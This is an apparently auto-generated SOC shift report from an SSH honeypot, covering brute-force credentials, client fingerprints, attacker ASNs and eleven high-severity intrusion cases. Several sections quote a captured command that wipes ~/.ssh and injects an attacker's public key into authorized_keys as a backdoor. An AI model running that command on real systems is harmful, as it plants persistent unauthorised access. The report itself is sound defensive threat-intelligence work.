# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-23 |
| **Generated At** | 2026-05-23T17:04:52Z |
| **Shift Time** | 17:04 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **780** |
| Confirmed Threats | **774** |
| False Positives Filtered | **6** (0.8%) |
| Unique Attacker IPs | **29** |
| Countries of Origin | **11** |
| High Severity Cases | **11** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **769** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **27** |
| Unique Credential Pairs | **20** |
| Unique Usernames | **12** |
| Unique Passwords | **17** |
| Successful Auth Pairs | **9** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 11 |
| `345gs5662d34` | 5 |
| `student` | 2 |
| `sav` | 1 |
| `administrador` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 5 |
| `3245gs5662d34` | 4 |
| `password` | 2 |
| `123` | 2 |
| `123456` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 5 |
| `root` | `3245gs5662d34` | 4 |
| `sav` | `sav` | 1 |
| `student` | `password` | 1 |
| `administrador` | `123` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Wy123456@` | `186.31.95.163` | 2026-05-23T15:24:12 |
| `root` | `3245gs5662d34` | `186.31.95.163` | 2026-05-23T15:24:19 |
| `root` | `qweasd123` | `120.48.76.190` | 2026-05-23T15:32:30 |
| `root` | `123123` | `186.31.95.163` | 2026-05-23T15:38:16 |
| `root` | `admin2025!` | `120.48.39.73` | 2026-05-23T15:41:08 |
| `root` | `a123456789*` | `186.31.95.163` | 2026-05-23T15:42:58 |
| `root` | `Pass@12345` | `120.48.76.190` | 2026-05-23T15:51:36 |
| `root` | `Aaa123321` | `179.40.112.10` | 2026-05-23T16:25:46 |
| `root` | `3245gs5662d34` | `179.40.112.10` | 2026-05-23T16:25:54 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **780** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 47 |
| Perl Net::SSH | 2 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 30 | 5 |
| `03a80b21afa8...` | Modern SSH client | 5 | 3 |
| `3c0eaacec19b...` | Mirai/variant | 2 | 2 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 30 | 5 | Mirai/variant |
| `95420f9d932d...` | libssh | 12 | 5 | — |
| `03a80b21afa8...` | libssh | 5 | 3 | Modern SSH client |
| `3c0eaacec19b...` | Perl Net::SSH | 2 | 2 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1082, T1592` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 5 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
Source IPs: `120.48.76.190`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `120.48.39.73`, `186.31.95.163`, `179.40.112.10`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **29** |
| Unique ASNs | **19** |
| High-Risk ASNs | **15** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS213412` | ONYPHE SAS | 6 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 3 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS396982` | Google LLC | 2 | LOW |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 1 | HIGH |
| `AS48909` | CityLine LLC | 1 | LOW |
| `AS139762` | Solution | 1 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (11)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-1ddc0434c3c1

| Field | Detail |
|---|---|
| **Source IP** | `186.31.95[.]163` |
| **First Seen** | 2026-05-23 15:24 |
| **Last Seen** | 2026-05-23 15:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 15:24:11` | `cowrie.session.connect` |
| `2026-05-23 15:24:11` | `cowrie.client.version` |
| `2026-05-23 15:24:11` | `cowrie.client.kex` |
| `2026-05-23 15:24:12` | `cowrie.login.success` |
| `2026-05-23 15:24:13` | `cowrie.session.params` |
| `2026-05-23 15:24:13` | `cowrie.command.input` |
| `2026-05-23 15:24:13` | `cowrie.command.failed` |
| `2026-05-23 15:24:14` | `cowrie.log.closed` |
| `2026-05-23 15:24:14` | `cowrie.session.params` |
| `2026-05-23 15:24:14` | `cowrie.command.input` |
| `2026-05-23 15:24:14` | `cowrie.session.file_download` |
| `2026-05-23 15:24:14` | `cowrie.log.closed` |
| `2026-05-23 15:24:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.31.95[.]163` to AbuseIPDB if not already reported
- [ ] Block `186.31.95[.]163` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0fb64375d2d

| Field | Detail |
|---|---|
| **Source IP** | `186.31.95[.]163` |
| **First Seen** | 2026-05-23 15:24 |
| **Last Seen** | 2026-05-23 15:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 15:24:17` | `cowrie.session.connect` |
| `2026-05-23 15:24:17` | `cowrie.client.version` |
| `2026-05-23 15:24:18` | `cowrie.client.kex` |
| `2026-05-23 15:24:19` | `cowrie.login.success` |
| `2026-05-23 15:24:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.31.95[.]163` to AbuseIPDB if not already reported
- [ ] Block `186.31.95[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33d6b638327e

| Field | Detail |
|---|---|
| **Source IP** | `120.48.76[.]190` |
| **First Seen** | 2026-05-23 15:32 |
| **Last Seen** | 2026-05-23 15:33 |
| **Session Duration** | 49s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 15:32:25` | `cowrie.session.connect` |
| `2026-05-23 15:32:25` | `cowrie.client.version` |
| `2026-05-23 15:32:25` | `cowrie.client.kex` |
| `2026-05-23 15:32:30` | `cowrie.login.success` |
| `2026-05-23 15:32:33` | `cowrie.session.params` |
| `2026-05-23 15:32:33` | `cowrie.command.input` |
| `2026-05-23 15:32:33` | `cowrie.command.failed` |
| `2026-05-23 15:32:42` | `cowrie.log.closed` |
| `2026-05-23 15:32:42` | `cowrie.session.params` |
| `2026-05-23 15:32:42` | `cowrie.command.input` |
| `2026-05-23 15:32:50` | `cowrie.session.file_download` |
| `2026-05-23 15:32:50` | `cowrie.log.closed` |
| `2026-05-23 15:33:06` | `cowrie.session.params` |
| `2026-05-23 15:33:06` | `cowrie.command.input` |
| `2026-05-23 15:33:14` | `cowrie.log.closed` |
| `2026-05-23 15:33:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.76[.]190` to AbuseIPDB if not already reported
- [ ] Block `120.48.76[.]190` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bba76349604

| Field | Detail |
|---|---|
| **Source IP** | `186.31.95[.]163` |
| **First Seen** | 2026-05-23 15:38 |
| **Last Seen** | 2026-05-23 15:38 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 15:38:15` | `cowrie.session.connect` |
| `2026-05-23 15:38:15` | `cowrie.client.version` |
| `2026-05-23 15:38:15` | `cowrie.client.kex` |
| `2026-05-23 15:38:16` | `cowrie.login.success` |
| `2026-05-23 15:38:17` | `cowrie.session.params` |
| `2026-05-23 15:38:17` | `cowrie.command.input` |
| `2026-05-23 15:38:17` | `cowrie.command.failed` |
| `2026-05-23 15:38:18` | `cowrie.log.closed` |
| `2026-05-23 15:38:18` | `cowrie.session.params` |
| `2026-05-23 15:38:18` | `cowrie.command.input` |
| `2026-05-23 15:38:18` | `cowrie.session.file_download` |
| `2026-05-23 15:38:18` | `cowrie.log.closed` |
| `2026-05-23 15:38:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.31.95[.]163` to AbuseIPDB if not already reported
- [ ] Block `186.31.95[.]163` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db04f5628c76

| Field | Detail |
|---|---|
| **Source IP** | `186.31.95[.]163` |
| **First Seen** | 2026-05-23 15:38 |
| **Last Seen** | 2026-05-23 15:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 15:38:22` | `cowrie.session.connect` |
| `2026-05-23 15:38:22` | `cowrie.client.version` |
| `2026-05-23 15:38:22` | `cowrie.client.kex` |
| `2026-05-23 15:38:23` | `cowrie.login.success` |
| `2026-05-23 15:38:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.31.95[.]163` to AbuseIPDB if not already reported
- [ ] Block `186.31.95[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28745d45c887

| Field | Detail |
|---|---|
| **Source IP** | `120.48.39[.]73` |
| **First Seen** | 2026-05-23 15:41 |
| **Last Seen** | 2026-05-23 15:41 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 15:41:07` | `cowrie.session.connect` |
| `2026-05-23 15:41:07` | `cowrie.client.version` |
| `2026-05-23 15:41:07` | `cowrie.client.kex` |
| `2026-05-23 15:41:08` | `cowrie.login.success` |
| `2026-05-23 15:41:09` | `cowrie.session.params` |
| `2026-05-23 15:41:09` | `cowrie.command.input` |
| `2026-05-23 15:41:09` | `cowrie.command.failed` |
| `2026-05-23 15:41:09` | `cowrie.log.closed` |
| `2026-05-23 15:41:10` | `cowrie.session.params` |
| `2026-05-23 15:41:10` | `cowrie.command.input` |
| `2026-05-23 15:41:11` | `cowrie.session.file_download` |
| `2026-05-23 15:41:11` | `cowrie.log.closed` |
| `2026-05-23 15:41:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.39[.]73` to AbuseIPDB if not already reported
- [ ] Block `120.48.39[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df251428aab9

| Field | Detail |
|---|---|
| **Source IP** | `186.31.95[.]163` |
| **First Seen** | 2026-05-23 15:42 |
| **Last Seen** | 2026-05-23 15:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 15:42:57` | `cowrie.session.connect` |
| `2026-05-23 15:42:57` | `cowrie.client.version` |
| `2026-05-23 15:42:57` | `cowrie.client.kex` |
| `2026-05-23 15:42:58` | `cowrie.login.success` |
| `2026-05-23 15:42:59` | `cowrie.session.params` |
| `2026-05-23 15:42:59` | `cowrie.command.input` |
| `2026-05-23 15:42:59` | `cowrie.command.failed` |
| `2026-05-23 15:42:59` | `cowrie.log.closed` |
| `2026-05-23 15:43:00` | `cowrie.session.params` |
| `2026-05-23 15:43:00` | `cowrie.command.input` |
| `2026-05-23 15:43:00` | `cowrie.session.file_download` |
| `2026-05-23 15:43:00` | `cowrie.log.closed` |
| `2026-05-23 15:43:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.31.95[.]163` to AbuseIPDB if not already reported
- [ ] Block `186.31.95[.]163` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f6053b53bf2

| Field | Detail |
|---|---|
| **Source IP** | `186.31.95[.]163` |
| **First Seen** | 2026-05-23 15:43 |
| **Last Seen** | 2026-05-23 15:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 15:43:03` | `cowrie.session.connect` |
| `2026-05-23 15:43:03` | `cowrie.client.version` |
| `2026-05-23 15:43:04` | `cowrie.client.kex` |
| `2026-05-23 15:43:05` | `cowrie.login.success` |
| `2026-05-23 15:43:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.31.95[.]163` to AbuseIPDB if not already reported
- [ ] Block `186.31.95[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eed12403be07

| Field | Detail |
|---|---|
| **Source IP** | `120.48.76[.]190` |
| **First Seen** | 2026-05-23 15:51 |
| **Last Seen** | 2026-05-23 15:51 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 15:51:32` | `cowrie.session.connect` |
| `2026-05-23 15:51:32` | `cowrie.client.version` |
| `2026-05-23 15:51:33` | `cowrie.client.kex` |
| `2026-05-23 15:51:36` | `cowrie.login.success` |
| `2026-05-23 15:51:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.76[.]190` to AbuseIPDB if not already reported
- [ ] Block `120.48.76[.]190` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e353f71ecf9

| Field | Detail |
|---|---|
| **Source IP** | `179.40.112[.]10` |
| **First Seen** | 2026-05-23 16:25 |
| **Last Seen** | 2026-05-23 16:25 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 16:25:44` | `cowrie.session.connect` |
| `2026-05-23 16:25:44` | `cowrie.client.version` |
| `2026-05-23 16:25:44` | `cowrie.client.kex` |
| `2026-05-23 16:25:46` | `cowrie.login.success` |
| `2026-05-23 16:25:47` | `cowrie.session.params` |
| `2026-05-23 16:25:47` | `cowrie.command.input` |
| `2026-05-23 16:25:47` | `cowrie.command.failed` |
| `2026-05-23 16:25:47` | `cowrie.log.closed` |
| `2026-05-23 16:25:48` | `cowrie.session.params` |
| `2026-05-23 16:25:48` | `cowrie.command.input` |
| `2026-05-23 16:25:48` | `cowrie.session.file_download` |
| `2026-05-23 16:25:48` | `cowrie.log.closed` |
| `2026-05-23 16:25:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.40.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `179.40.112[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-faa3d541c9f5

| Field | Detail |
|---|---|
| **Source IP** | `179.40.112[.]10` |
| **First Seen** | 2026-05-23 16:25 |
| **Last Seen** | 2026-05-23 16:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 16:25:52` | `cowrie.session.connect` |
| `2026-05-23 16:25:52` | `cowrie.client.version` |
| `2026-05-23 16:25:52` | `cowrie.client.kex` |
| `2026-05-23 16:25:54` | `cowrie.login.success` |
| `2026-05-23 16:25:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.40.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `179.40.112[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `14.1.16[.]230` | **693** | 2026-05-23 15:03 | 2026-05-23 17:03 | 505m | 0 | `T1592` | 🟠 MEDIUM |
| `97.74.236[.]238` | **16** | 2026-05-23 15:16 | 2026-05-23 16:31 | 8m | 0 | `T1592` | 🟠 MEDIUM |
| `120.48.76[.]190` | **15** | 2026-05-23 15:15 | 2026-05-23 15:55 | 22m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `186.31.95[.]163` | **10** | 2026-05-23 15:05 | 2026-05-23 15:47 | 0m | 9 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `45.148.120[.]187` | **5** | 2026-05-23 15:38 | 2026-05-23 16:46 | 6m | 0 | `T1592` | 🟢 LOW |
| `210.14.142[.]89` | **3** | 2026-05-23 16:25 | 2026-05-23 16:38 | 2m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.172[.]184` | **3** | 2026-05-23 16:36 | 2026-05-23 16:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `120.48.39[.]73` | **2** | 2026-05-23 15:41 | 2026-05-23 15:43 | 4m | 0 | `T1592` | 🟢 LOW |
| `14.103.114[.]89` | **2** | 2026-05-23 15:14 | 2026-05-23 15:26 | 4m | 0 | `T1592` | 🟢 LOW |
| `101.36.111[.]119` | 1 | 2026-05-23 17:02 | 2026-05-23 17:02 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.29.110[.]89` | 1 | 2026-05-23 15:43 | 2026-05-23 15:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.151[.]242` | 1 | 2026-05-23 16:25 | 2026-05-23 16:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.196.142[.]135` | 1 | 2026-05-23 16:34 | 2026-05-23 16:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.46.184[.]6` | 1 | 2026-05-23 16:27 | 2026-05-23 16:29 | 120s | 0 | `T1592` | 🟢 LOW |
